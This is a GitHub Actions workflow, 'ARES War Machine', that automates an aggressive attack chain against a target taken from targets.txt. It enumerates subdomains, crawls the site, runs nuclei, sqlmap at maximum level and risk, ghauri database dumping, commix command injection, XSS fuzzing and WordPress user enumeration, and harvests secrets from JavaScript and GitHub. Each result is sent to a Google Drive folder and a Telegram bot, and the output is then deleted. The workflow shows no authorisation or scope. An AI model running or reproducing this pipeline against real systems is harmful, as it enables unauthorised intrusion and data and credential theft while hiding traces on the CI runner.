name: ARES War Machine - PERSISTENT AGGRESSIVE
on:
  workflow_dispatch:

jobs:
  security-hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout Repo
        uses: actions/checkout@v4

      - name: "Global Arsenal & Wordlist Load"
        run: |
          sudo apt-get update
          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
          mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
          echo "$HOME/bin" >> $GITHUB_PATH
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
          pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2

          # WORDLISTS (Verified Links)
          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt -O wordlists/dir-med.txt
          wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -O wordlists/subs.txt

          # INSTALL ALL 60+ TOOLS
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
          go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
          go install -v github.com/lc/gau/v2/cmd/gau@latest || true
          go install -v github.com/hahwul/dalfox/v2@latest || true
          go install -v github.com/ffuf/ffuf@latest || true
          go install -v github.com/sensepost/gowitness@latest || true
          go install -v github.com/tomnomnom/waybackurls@latest || true
          pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap waymore jsluice jwt_tool kiterunner wpscan eyewitness secretfinder || true
          git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true

      - name: "ARES Persistent Execution & Absolute Sync"
        env:
          CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
          REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
          FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          TARGET=$(cat targets.txt | head -n 1)
          
          send_msg() {
            curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"
          }

          # NEW: Uploader that KEEPS the file for the next tool
          cat << 'EOF' > oauth_upload.py
          import os, sys
          from google.oauth2.credentials import Credentials
          from googleapiclient.discovery import build
          from googleapiclient.http import MediaFileUpload
          def upload(f_path, folder_id):
              if not os.path.exists(f_path) or os.path.getsize(f_path) == 0: return
              creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], 
                                 token_uri="https://oauth2.googleapis.com/token",
                                 client_id=os.environ['CLIENT_ID'], 
                                 client_secret=os.environ['CLIENT_SECRET'])
              service = build("drive", "v3", credentials=creds)
              meta = {"name": os.path.basename(f_path), "parents": [folder_id]}
              media = MediaFileUpload(f_path, resumable=True)
              service.files().create(body=meta, media_body=media, supportsAllDrives=True).execute()
              print(f"✅ Synced: {f_path}")
          if __name__ == "__main__":
              upload(sys.argv[1], sys.argv[2])
          EOF

          send_msg "☢️ *ARES:* PERSISTENT Aggressive Hunt Engaged on \`$TARGET\`"

          # STAGE 1: SUBDOMAINS (Persistent)
          subfinder -d $TARGET -all -recursive -o output/recon/subs.txt
          [ ! -s output/recon/subs.txt ] && echo $TARGET > output/recon/subs.txt
          python3 oauth_upload.py "output/recon/subs.txt" "$FOLDER_ID"

          # STAGE 2: LIVE PROBING (Required by Stage 3-12)
          httpx -l output/recon/subs.txt -sc -td -title -ip -o output/probing/live.txt
          [ ! -s output/probing/live.txt ] && echo "http://$TARGET" > output/probing/live.txt
          python3 oauth_upload.py "output/probing/live.txt" "$FOLDER_ID"

          # STAGE 3: VISUAL RECON
          xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
          zip -r "screenshots.zip" output/screenshots/ && python3 oauth_upload.py "screenshots.zip" "$FOLDER_ID"

          # STAGE 4: AGGRESSIVE CRAWLING
          katana -l output/probing/live.txt -d 10 -jc -kf all -o output/crawling/urls.txt
          python3 oauth_upload.py "output/crawling/urls.txt" "$FOLDER_ID"

          # STAGE 5: URL HARVESTING
          gau $TARGET > output/crawling/gau.txt || true
          waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
          python3 oauth_upload.py "output/crawling/waymore.txt" "$FOLDER_ID"

          # STAGE 6: PARAMETERS (Arjun Aggressive)
          arjun -i output/crawling/urls.txt -t 20 -oT output/fuzzing/params.txt || true
          python3 oauth_upload.py "output/fuzzing/params.txt" "$FOLDER_ID"

          # STAGE 7: NUCLEI EXPLOITATION
          nuclei -l output/probing/live.txt -severity critical,high,medium -o output/vulns/nuclei.txt
          python3 oauth_upload.py "output/vulns/nuclei.txt" "$FOLDER_ID"

          # STAGE 8: SQLMAP AGGRESSIVE (Level 5 Risk 3)
          sqlmap -m output/crawling/urls.txt --batch --random-agent --level 5 --risk 3 --threads 10 --crawl=2 > output/vulns/sqlmap.txt || true
          ghauri -u "http://$TARGET" --batch --dbs > output/vulns/ghauri.txt || true
          python3 oauth_upload.py "output/vulns/sqlmap.txt" "$FOLDER_ID"

          # STAGE 9: FUZZING
          ffuf -w wordlists/dir-med.txt -u http://$TARGET/FUZZ -t 100 -o output/fuzzing/ffuf.json || true
          python3 oauth_upload.py "output/fuzzing/ffuf.json" "$FOLDER_ID"

          # STAGE 10: SECRETS
          trufflehog github --repo="https://github.com/$TARGET" > output/secrets/truffle.txt || true
          cat output/crawling/urls.txt | grep ".js" | xargs -I % python3 $HOME/tools/SecretFinder/SecretFinder.py -i % -o cli > output/secrets/js.txt || true
          python3 oauth_upload.py "output/secrets/js.txt" "$FOLDER_ID"

          # STAGE 11: WEB VULNS
          commix --url="http://$TARGET" --batch > output/vulns/commix.txt || true
          dalfox file output/crawling/urls.txt -o output/vulns/xss.txt || true
          python3 oauth_upload.py "output/vulns/xss.txt" "$FOLDER_ID"

          # STAGE 12: SPECIALIZED
          wpscan --url http://$TARGET --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
          python3 oauth_upload.py "output/specialized/wpscan.txt" "$FOLDER_ID"

          # FINAL CLEANUP: NOW EVERYTHING IS GONE
          rm -rf output/ wordlists/
          send_msg "✅ *ARES Persistent:* Scan Complete. Drive Synced. GitHub Cleaned."
          
